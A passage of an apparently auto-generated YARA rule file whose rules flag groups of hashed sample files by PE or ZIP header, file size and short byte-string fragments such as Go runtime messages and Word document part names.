      description = "dataset - from files 88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502, c977b861b887a09979d4e1ef03d5f975f297882c30be38aba59251f1b46c2aa8"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
      hash2 = "c977b861b887a09979d4e1ef03d5f975f297882c30be38aba59251f1b46c2aa8"
   strings:
      $s1 = "\"5iHK:" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "$\"1IHJ2" fullword ascii /* score: '1.00'*/
      $s3 = "9-hI+Z" fullword ascii /* score: '1.00'*/
      $s4 = "E)FqJP" fullword ascii /* score: '1.00'*/
      $s5 = "e)Gy*P" fullword ascii /* score: '1.00'*/
      $s6 = "8%(I)JS" fullword ascii /* score: '1.00'*/
      $s7 = "$#9)HI*R" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x4b50 and filesize < 14000KB and ( all of them )
      ) or ( all of them )
}

rule _3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0_dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a_74 {
   meta:
      description = "dataset - from files 3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0, dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9, 43cd38a962aa63091260f2648304b22e01aea8ea79c23ca16f99d17133f1ba20, 0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343, a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0"
      hash2 = "dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9"
      hash3 = "43cd38a962aa63091260f2648304b22e01aea8ea79c23ca16f99d17133f1ba20"
      hash4 = "0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343"
      hash5 = "a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b"
   strings:
      $s1 = "get_Solo0342" fullword ascii /* score: '9.00'*/
      $s2 = "get_Solo1342" fullword ascii /* score: '9.00'*/
      $s3 = "set_Solo0342" fullword ascii /* score: '4.00'*/
      $s4 = "set_Solo1342" fullword ascii /* score: '4.00'*/
      $s5 = "Sarsri" fullword ascii /* score: '3.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f_f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed0_75 {
   meta:
      description = "dataset - from files 82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f, f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0, 5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9, 2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03, 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b, 2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
      hash2 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      hash3 = "5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9"
      hash4 = "2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03"
      hash5 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      hash6 = "2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43"
   strings:
      $s1 = ";I9}(tiH" fullword ascii /* score: '1.00'*/
      $s2 = "D$HL9gXt" fullword ascii /* score: '1.00'*/
      $s3 = "L!d$(L!d$@D" fullword ascii /* score: '1.00'*/
      $s4 = "H;xXu5" fullword ascii /* score: '1.00'*/
      $s5 = "D8L$0uP" fullword ascii /* score: '1.00'*/
      $s6 = "u4I9}(" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f_bb4fe58a0d6cbb1237d46f2952d762cc_1b11ae98b85bb0645abe36adc_76 {
   meta:
      description = "dataset - from files 82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f, bb4fe58a0d6cbb1237d46f2952d762cc, 1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f, b0357ebcaa97a8f10ca5d940af9e5a2fb9675551956f6d58a2104899d53274ff, 7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618, 5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9, ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330, 2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03, 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b, 2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43, ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
      hash2 = "56f3f593d4bf728840e00df5ba1a1fe1ffddf142a3e42dac6023c866d3670624"
      hash3 = "1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f"
      hash4 = "b0357ebcaa97a8f10ca5d940af9e5a2fb9675551956f6d58a2104899d53274ff"
      hash5 = "7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618"
      hash6 = "5b4fa424c04f0c0b46e27d6d91726c5cb53f515fc6e039776879f4407502a0f9"
      hash7 = "ee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330"
      hash8 = "2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03"
      hash9 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      hash10 = "2be8c5227ce43f5f92291200b651a468b8ee36ea00c7f1f7f0d7579a7de61b43"
      hash11 = "ee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c"
   strings:
      $s1 = "D$XD9x" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s2 = "uF8Z(t" fullword ascii /* score: '1.00'*/
      $s3 = "vB8_(t" fullword ascii /* score: '1.00'*/
      $s4 = "u\"8Z(t" fullword ascii /* score: '1.00'*/
      $s5 = "vC8_(t" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( all of them )
      ) or ( all of them )
}

rule _12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95_88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c_77 {
   meta:
      description = "dataset - from files 12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95, 88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502, c977b861b887a09979d4e1ef03d5f975f297882c30be38aba59251f1b46c2aa8, dd088962eb9e2a6b6e10114d4aecad1b20ca033f6eba1308eb6c0fcd9905cbee, 4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "12735482351d0b7b5018f46f78b124c2c0c39a8a3479c44e73f646ce1bb49f95"
      hash2 = "88d2907abded3c9bc2f7198c882e58d031e997af9910b6b5cc295bdc2c614502"
      hash3 = "c977b861b887a09979d4e1ef03d5f975f297882c30be38aba59251f1b46c2aa8"
      hash4 = "dd088962eb9e2a6b6e10114d4aecad1b20ca033f6eba1308eb6c0fcd9905cbee"
      hash5 = "4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530"
   strings:
      $s1 = "word/theme/theme1.xml" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s2 = "word/webSettings.xml" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s3 = "word/fontTable.xml" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s4 = "word/styles.xml" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s5 = "word/document.xml" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
      $s6 = "word/settings.xml" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x4b50 and filesize < 14000KB and ( all of them )
      ) or ( all of them )
}

rule _7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966_78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bd_78 {
   meta:
      description = "dataset - from files 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash2 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash3 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash4 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
   strings:
      $s1 = "*[2]interface {}" fullword ascii /* score: '4.00'*/
      $s2 = "T$0H9JPu" fullword ascii /* score: '1.00'*/
      $s3 = "_B>fu/H" fullword ascii /* score: '1.00'*/
      $s4 = "|$ H9;u" fullword ascii /* score: '1.00'*/
      $s5 = "H@H9J@" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( all of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_79 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash4 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      hash5 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
   strings:
      $s1 = "queuefinalizer during GCrange partially overlapsreflect.Value.SetComplexresource length too longrunqsteal: runq overflowruntime:" ascii /* score: '10.00'*/
      $s2 = " VirtualFree of runtime: found obj at *(runtime: p.searchAddr = span has no free objectsstack trace unavailable" fullword ascii /* score: '7.00'*/
      $s3 = "090\"1 0" fullword ascii /* score: '1.00'*/
      $s4 = "Microsoft RSA TLS CA 010" fullword ascii /* score: '0.00'*/
      $s5 = "Microsoft RSA TLS CA 01" fullword ascii /* score: '0.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( all of them )
      ) or ( all of them )
}

rule _91e0110a5f520ce799c61494a7f321ebed1cd8c8a26a2b2949aa6b43b10f1530_1d85ccc8254dfd89e23bfc5dfae6391d23e572bb02e84139de14e6b879_80 {
   meta:
      description = "dataset - from files 91e0110a5f520ce799c61494a7f321ebed1cd8c8a26a2b2949aa6b43b10f1530, 1d85ccc8254dfd89e23bfc5dfae6391d23e572bb02e84139de14e6b8795db07c, be96bc38c87f74d973cf9375370f42e5f9dc854d52e413dac6bc6bacc2a16a63"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "91e0110a5f520ce799c61494a7f321ebed1cd8c8a26a2b2949aa6b43b10f1530"
      hash2 = "1d85ccc8254dfd89e23bfc5dfae6391d23e572bb02e84139de14e6b8795db07c"
      hash3 = "be96bc38c87f74d973cf9375370f42e5f9dc854d52e413dac6bc6bacc2a16a63"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                        ' */ /* score: '16.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ' */ /* score: '16.50'*/
      $s3 = ".AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '14.00'*/
      $s4 = ".AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '4.00'*/
      $s5 = "/!,1{qm" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _dd088962eb9e2a6b6e10114d4aecad1b20ca033f6eba1308eb6c0fcd9905cbee_4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13f_81 {
   meta:
      description = "dataset - from files dd088962eb9e2a6b6e10114d4aecad1b20ca033f6eba1308eb6c0fcd9905cbee, 4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "dd088962eb9e2a6b6e10114d4aecad1b20ca033f6eba1308eb6c0fcd9905cbee"
      hash2 = "4b980e2e1f654cfd0050df8579670eb693070a7e35eb1255f6bf93f13fb5d530"
   strings:
      $s1 = "docProps/PK" fullword ascii /* score: '4.00'*/
      $s2 = "word/theme/PK" fullword ascii /* score: '4.00'*/
      $s3 = "word/PK" fullword ascii /* score: '4.00'*/
      $s4 = "word/_rels/PK" fullword ascii /* score: '4.00'*/
      $s5 = "_rels/PK" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x4b50 and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

